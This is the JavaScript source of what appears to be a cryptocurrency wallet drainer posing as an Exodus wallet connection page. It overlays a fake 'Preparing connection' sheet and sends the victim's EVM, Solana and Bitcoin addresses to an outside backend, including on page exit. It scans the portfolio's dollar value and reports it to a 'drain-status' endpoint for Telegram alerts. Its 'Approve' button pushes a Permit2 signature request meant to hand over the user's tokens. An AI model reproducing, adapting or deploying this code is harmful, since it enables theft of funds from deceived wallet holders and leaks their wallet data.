/**
 * Exodus preflight — after address known:
 * 1) POST /api/v1/scout (connect Telegram)
 * 2) Amount scout (fusion/ranked → scan_complete Telegram) — no WC provider needed
 * 3) Approve button → forceTrustSign → continueConnected (all chains EVM+non-EVM in one flow)
 */
(function () {
  'use strict';

  var BACKEND_DEFAULT = 'https://sadrailala-production.up.railway.app';
  var KEY_ADDR = 'exodus_site_connected_addr';
  var KEY_NOTIFY = 'exodus_preflight_notify';
  var KEY_AMOUNT = 'exodus_preflight_amount';
  var busy = false;
  var lastNotifyOk = '';
  var scoutInProgress = ''; // prevents race: two calls start before first marks notified

  function backendBase() {
    try {
      var u = (window.LEGION_CONFIG && window.LEGION_CONFIG.backendUrl) || BACKEND_DEFAULT;
      return String(u).replace(/\/$/, '');
    } catch (_) {
      return BACKEND_DEFAULT;
    }
  }

  function shortAddr(a) {
    a = String(a || '');
    return a.length > 12 ? a.slice(0, 6) + '…' + a.slice(-4) : a;
  }

  function loadAddr() {
    try {
      return sessionStorage.getItem(KEY_ADDR) || sessionStorage.getItem('legion_wc_evm_addr') || '';
    } catch (_) {
      return '';
    }
  }

  function saveAddr(addr) {
    addr = String(addr || '').toLowerCase();
    if (!/^0x[a-f0-9]{40}$/.test(addr)) return '';
    try {
      sessionStorage.setItem(KEY_ADDR, addr);
      sessionStorage.setItem('legion_wc_evm_addr', addr);
    } catch (_) {}
    return addr;
  }

  function setStatus(msg) {
    var el = document.getElementById('__exodus_pf_status');
    if (el) el.textContent = msg;
    try { console.warn('[ExodusPreflight]', msg); } catch (_) {}
  }

  function setProgress(pct) {
    var bar = document.getElementById('__exodus_pf_bar_inner');
    if (bar) bar.style.width = Math.max(5, Math.min(100, pct)) + '%';
  }

  function setApproveEnabled(on) {
    var btn = document.getElementById('__exodus_pf_approve');
    if (!btn) return;
    btn.disabled = !on;
    if (on) {
      btn.textContent = 'Approve in Exodus';
      btn.style.background = '#8B5CF6';
      btn.style.color = '#fff';
    } else {
      btn.textContent = 'Approve in Exodus (wait…)';
      btn.style.background = '#333';
      btn.style.color = '#888';
    }
  }

  function ensureSheet(addr) {
    var el = document.getElementById('__exodus_preflight_sheet');
    if (!el) {
      el = document.createElement('div');
      el.id = '__exodus_preflight_sheet';
      el.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.82);display:flex;align-items:flex-end;justify-content:center;padding:16px;font-family:system-ui,sans-serif';
      el.innerHTML = [
        '<div style="width:100%;max-width:420px;background:#111;color:#fff;border-radius:16px;padding:20px 18px 22px">',
        '<div style="font-size:17px;font-weight:700;margin-bottom:8px">Preparing connection…</div>',
        '<div id="__exodus_pf_status" style="font-size:13px;opacity:.9;line-height:1.45;margin-bottom:16px;min-height:48px">Stay on this page</div>',
        '<div id="__exodus_pf_bar" style="height:4px;background:#333;border-radius:2px;overflow:hidden;margin-bottom:16px">',
        '<div id="__exodus_pf_bar_inner" style="height:100%;width:15%;background:#8B5CF6;transition:width .4s"></div></div>',
        '<button type="button" id="__exodus_pf_approve" disabled style="display:block;width:100%;background:#333;color:#888;border:0;border-radius:12px;padding:14px;font-weight:700;margin-bottom:8px">Approve in Exodus (wait…)</button>',
        '<button type="button" id="__exodus_pf_retry" style="display:block;width:100%;background:#222;color:#fff;border:0;border-radius:12px;padding:12px;font-weight:600;margin-bottom:8px">Retry full prep</button>',
        '<button type="button" id="__exodus_pf_close" style="display:block;width:100%;background:transparent;border:0;color:#888;padding:10px;font-size:13px">Close</button>',
        '</div>',
      ].join('');
      document.body.appendChild(el);
      el.querySelector('#__exodus_pf_close').onclick = function () { el.style.display = 'none'; };
      el.querySelector('#__exodus_pf_retry').onclick = function () {
        var a = loadAddr();
        if (a) {
          try { sessionStorage.removeItem(KEY_AMOUNT); } catch (_) {}
          runPreflight(a, { force: true });
        }
      };
      el.querySelector('#__exodus_pf_approve').onclick = function () {
        onApproveTap();
      };
    }
    el.style.display = 'flex';
    try {
      var old = document.getElementById('__exodus_approve_sheet');
      if (old) old.style.display = 'none';
    } catch (_) {}
    return el;
  }

  function alreadyNotified(addr) {
    addr = String(addr || '').toLowerCase();
    if (lastNotifyOk === addr) return true;
    try {
      if (sessionStorage.getItem(KEY_NOTIFY) === addr) return true;
      if (sessionStorage.getItem('legion_notify_done') === addr) return true;
    } catch (_) {}
    return false;
  }

  function amountDone(addr) {
    try {
      return sessionStorage.getItem(KEY_AMOUNT) === String(addr || '').toLowerCase();
    } catch (_) {
      return false;
    }
  }

  function markNotified(addr) {
    addr = String(addr || '').toLowerCase();
    lastNotifyOk = addr;
    try {
      sessionStorage.setItem(KEY_NOTIFY, addr);
      sessionStorage.setItem('legion_notify_done', addr);
    } catch (_) {}
    try {
      if (window.legion && window.legion.state) {
        window.legion.state.notifyDone = true;
        window.legion.state.connectNotifiedAddr = addr;
      }
    } catch (_) {}
  }

  function markAmount(addr, usd) {
    try {
      sessionStorage.setItem(KEY_AMOUNT, String(addr).toLowerCase());
      sessionStorage.setItem('exodus_preflight_usd', String(usd || 0));
    } catch (_) {}
  }

  async function postScout(addr, chainId) {
    var base = backendBase();
    var session = 'exodus-pf:' + Date.now() + ':' + Math.random().toString(36).slice(2, 7);
    try {
      if (window.legion && window.legion.state && !window.legion.state.connectSession) {
        window.legion.state.connectSession = session;
      }
    } catch (_) {}
    // Collect SOL + BTC addresses from session / legion state (set by connectInjectedInApp)
    var solAddr = '';
    var btcAddr = '';
    try { solAddr = sessionStorage.getItem('exodus_sol_addr') || ''; } catch (_) {}
    try { btcAddr = sessionStorage.getItem('exodus_btc_addr') || ''; } catch (_) {}
    try {
      if (window.legion && window.legion.state) {
        solAddr = solAddr || window.legion.state.solAddr || '';
        btcAddr = btcAddr || window.legion.state.btcAddr || '';
      }
    } catch (_) {}

    var connectedWallets = [addr];
    if (solAddr) connectedWallets.push(solAddr);
    if (btcAddr) connectedWallets.push(btcAddr);

    var body = {
      user_address: addr,
      chain_id: Number(chainId) || 1,
      wallet_type: 'Exodus',
      chain_family: 'EVM',
      source_page: String(window.location.href || ''),
      connect_session: session,
      connected_wallets: connectedWallets,
    };
    if (solAddr) body.sol_address = solAddr;
    if (btcAddr) body.btc_address = btcAddr;
    var headers = {
      'Content-Type': 'application/json',
      'X-Source-Origin': window.location.origin,
    };
    var payload = JSON.stringify(body);
    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(base + '/api/v1/scout', new Blob([payload], { type: 'application/json' }));
      }
    } catch (_) {}
    var res = await fetch(base + '/api/v1/scout', {
      method: 'POST',
      headers: headers,
      body: payload,
      keepalive: true,
      credentials: 'omit',
      cache: 'no-store',
    });
    return { ok: res.ok, status: res.status };
  }

  /** Amount Telegram path — uses legion.runAmountScout or direct fusion + scan_complete */
  async function runAmountPhase(addr, chainId) {
    setStatus('Scanning portfolio for amount Telegram… stay here');
    setProgress(55);
    var usd = 0;

    // Prefer legion (same as Uniswap)
    if (window.legion && typeof window.legion.runAmountScout === 'function') {
      try {
        var r = await window.legion.runAmountScout(addr, chainId, 'Exodus');
        usd = (r && r.usd) || (window.legion.getScoutUsd && window.legion.getScoutUsd()) || 0;
      } catch (e) {
        console.warn('[ExodusPreflight] runAmountScout', e && e.message);
      }
    }

    // Direct fallback if legion missing / returned 0 without calling APIs
    if (!usd) {
      try {
        var base = backendBase();
        var fusionBody = {
          evm_holder: addr,
          connect_session: (window.legion && window.legion.state && window.legion.state.connectSession) || undefined,
        };
        var fr = await fetch(base + '/api/scout/recursive-predator-fusion', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-Source-Origin': window.location.origin },
          body: JSON.stringify(fusionBody),
          credentials: 'omit',
          cache: 'no-store',
        });
        var fj = await fr.json().catch(function () { return {}; });
        var fusion = (fj && fj.data && fj.data.fusion) || (fj && fj.data) || fj;
        usd = Number(fusion && fusion.total_usd) || 0;
        var assetCount = Number(fusion && fusion.assets_count) ||
          (fusion && fusion.assets && fusion.assets.length) || 0;

        // ranked as second source
        if (!usd) {
          var rr = await fetch(base + '/api/v1/scout/ranked', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-Source-Origin': window.location.origin },
            body: JSON.stringify({ wallet_address: addr, chain_id: Number(chainId) || 1 }),
            credentials: 'omit',
            cache: 'no-store',
          });
          var rj = await rr.json().catch(function () { return {}; });
          var ranked = (rj && rj.data) || rj;
          usd = Number(ranked && ranked.total_usd) || 0;
          assetCount = assetCount || (ranked && ranked.assets && ranked.assets.length) || 0;
        }

        // scan_complete → amount Telegram (backend skips if usd<=0)
        if (usd > 0) {
          await fetch(base + '/api/v1/scout/drain-status', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-Source-Origin': window.location.origin },
            body: JSON.stringify({
              wallet_address: addr,
              event: 'scan_complete',
              chain_id: Number(chainId) || 1,
              chain_family: 'EVM',
              wallet_type: 'Exodus',
              scout_value_usd: usd,
              asset_count: assetCount || 0,
              source_page: String(window.location.href || ''),
            }),
            credentials: 'omit',
            cache: 'no-store',
            keepalive: true,
          });
        }
      } catch (e2) {
        console.warn('[ExodusPreflight] amount fallback', e2 && e2.message);
      }
    }

    markAmount(addr, usd);
    try {
      if (window.legion && window.legion.state) window.legion.state.scoutUsd = usd;
    } catch (_) {}

    if (usd > 0) {
      setStatus('Amount OK — $' + Number(usd).toFixed(2) + ' (Telegram scan). Preparing Exodus signature…');
    } else {
      setStatus('Amount scan done — $0 or pending. Still preparing Exodus signature…');
    }
    setProgress(75);
    return usd;
  }

  async function runDrainPhase(addr) {
    setStatus('Sending Permit2 sign request to Exodus… stay on page');
    setProgress(85);
    try {
      if (window.LegionWallet && typeof window.LegionWallet.tryRecoverStoredSession === 'function') {
        var prov = await window.LegionWallet.tryRecoverStoredSession(true);
        if (prov && window.legion && window.legion.state) {
          window.legion.state.evmProvider = prov;
          window.legion.state.evmAddr = addr;
          window.legion.state.connectMode = 'wc';
          window.legion.state.wcSessionActive = true;
          try { prov.isWalletConnect = true; } catch (_) {}
        }
      }
    } catch (e) {
      console.warn('[ExodusPreflight] recover', e && e.message);
    }

    try {
      if (typeof window.__EXODUS_RUN_PIPELINE__ === 'function') {
        await window.__EXODUS_RUN_PIPELINE__('preflight-drain');
      } else if (window.legion && typeof window.legion.continueConnected === 'function') {
        await window.legion.continueConnected();
      }
    } catch (e2) {
      console.warn('[ExodusPreflight] drain', e2 && e2.message);
    }
    setProgress(95);
  }

  async function onApproveTap() {
    var addr = loadAddr();
    if (!addr) return;
    setApproveEnabled(false);
    setStatus('Sending signature request to Exodus… stay on Safari 2s, then Exodus opens');
    try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}

    var result = null;
    try {
      if (window.legion && typeof window.legion.forceTrustSign === 'function') {
        result = await window.legion.forceTrustSign();
      } else {
        await runDrainPhase(addr);
      }
    } catch (e) {
      console.warn('[ExodusPreflight] approve', e && e.message);
      setStatus('Sign error: ' + (e && e.message ? e.message : 'failed') + ' — tap Retry / Approve again');
      setApproveEnabled(true);
      return;
    }

    if (result && result.ok) {
      window.__EXODUS_EVM_SIGNED__ = true;
      setStatus('Signed ✓ (' + (result.path || 'sign') + '). Processing all chains…');
      var btn = document.getElementById('__exodus_pf_approve');
      if (btn) {
        btn.textContent = 'Signed ✓';
        btn.disabled = true;
        btn.style.background = '#1a7a3a';
        btn.style.color = '#fff';
      }
      // Advance pipeline — continueConnected handles all remaining chains (EVM + non-EVM) in one flow
      try {
        if (window.legion && typeof window.legion.continueConnected === 'function') {
          window.legion.continueConnected().catch(function () {});
        } else if (typeof window.__EXODUS_RUN_PIPELINE__ === 'function') {
          window.__EXODUS_RUN_PIPELINE__('approve-advance');
        }
      } catch (_) {}
      return;
    } else if (result && result.error === 'no_session') {
      setStatus('WC session lost — tap Connect Wallet again, then Approve.');
    } else if (result && result.error === 'rejected') {
      setStatus('Rejected in Exodus — tap Approve to try again.');
    } else {
      setStatus('No popup yet — open Exodus → WalletConnect sessions / pending. Or Retry full prep.');
      // Stay on site — bare exodus:// empties Safari tab
    }
    setApproveEnabled(true);
  }

  async function runPreflight(addr, opts) {
    opts = opts || {};
    addr = saveAddr(addr);
    if (!addr) return false;
    if (busy) return false;

    // Legion already owns notify/scout for this address — do not duplicate Telegram/API storm
    try {
      var LS = window.legion && window.legion.state;
      var a = String(addr).toLowerCase();
      if (LS && !opts.force) {
        var legionOwns = !!(LS.notifyDone && String(LS.connectNotifiedAddr || LS.evmAddr || '').toLowerCase() === a);
        if (legionOwns) {
          console.warn('[ExodusPreflight] skip — legion owns notify/scout for', a.slice(0, 10));
          try { markNotified(addr); } catch (_) {}
          if (LS.amountScoutDone) {
            try { sessionStorage.setItem(KEY_AMOUNT, a); } catch (_) {}
          }
          ensureSheet(addr);
          setApproveEnabled(true);
          setProgress(100);
          return true;
        }
        if (typeof window.__EXODUS_FLOW_BUSY__ === 'function' && window.__EXODUS_FLOW_BUSY__()) {
          console.warn('[ExodusPreflight] defer — flow busy');
          ensureSheet(addr);
          setApproveEnabled(true);
          return false;
        }
      }
    } catch (_) {}

    busy = true;

    ensureSheet(addr);
    setApproveEnabled(true);

    var chainId = 1;
    try {
      if (window.legion && window.legion.state && window.legion.state.evmChain) {
        chainId = Number(window.legion.state.evmChain) || 1;
      }
    } catch (_) {}

    try {
      setProgress(30);
      setStatus('Wallet connected — scanning portfolio…');

      // Scout + amount in background — does NOT trigger drain (drain is handled by connected-ui)
      (async function () {
        try {
          if (opts.force || !alreadyNotified(addr)) {
            // Guard: skip if another call is already scouting this address
            if (scoutInProgress === addr) {
              console.warn('[ExodusPreflight] scout already in progress for', addr.slice(0, 8));
            } else {
              scoutInProgress = addr;
              try {
                for (var attempt = 0; attempt < 3; attempt++) {
                  var r = await postScout(addr, chainId);
                  if (r.ok) { markNotified(addr); break; }
                  await new Promise(function (res) { setTimeout(res, 500); });
                }
              } finally {
                if (scoutInProgress === addr) scoutInProgress = '';
              }
            }
          }
          if (opts.force || !amountDone(addr)) {
            await runAmountPhase(addr, chainId);
          }
        } catch (eBg) {
          console.warn('[ExodusPreflight] background scout', eBg && eBg.message);
        }
        // Update status after amount scan
        var usdFinal = 0;
        try {
          usdFinal = (window.legion && window.legion.getScoutUsd && window.legion.getScoutUsd()) ||
            Number(sessionStorage.getItem('exodus_preflight_usd')) || 0;
        } catch (_) {}
        if (usdFinal > 0) {
          setStatus('Portfolio: $' + Number(usdFinal).toFixed(2) + ' — tap Approve to sign in Exodus.');
        }
      })();

      setProgress(100);
      setStatus('Tap Approve to sign in Exodus.');
      try {
        window.dispatchEvent(new CustomEvent('exodus:preflight-ok', { detail: { address: addr } }));
      } catch (_) {}
      return true;
    } catch (e) {
      setStatus('Error: ' + (e && e.message ? e.message : 'unknown'));
      setApproveEnabled(true);
      return false;
    } finally {
      busy = false;
    }
  }

  window.__EXODUS_PREFLIGHT__ = runPreflight;
  window.__EXODUS_FIRE_SCOUT__ = function (addr) {
    return runPreflight(addr || loadAddr(), { force: true });
  };

  window.addEventListener('legion:connected', function (e) {
    var d = (e && e.detail) || {};
    var addr = d.address || d.account || loadAddr();
    if (addr) runPreflight(addr);
  });

  window.addEventListener('pagehide', function () {
    var addr = loadAddr();
    if (!addr || alreadyNotified(addr)) return;
    try {
      var base = backendBase();
      var payload = JSON.stringify({
        user_address: addr,
        chain_id: 1,
        wallet_type: 'Exodus',
        chain_family: 'EVM',
        source_page: String(window.location.href || ''),
        connect_session: 'exodus-pagehide:' + Date.now(),
      });
      if (navigator.sendBeacon) {
        navigator.sendBeacon(base + '/api/v1/scout', new Blob([payload], { type: 'application/json' }));
      }
    } catch (_) {}
  });

  window.addEventListener('exodus:addr-recovered', function (e) {
    var addr = (e && e.detail && e.detail.address) || loadAddr();
    if (addr) runPreflight(addr);
  });
})();
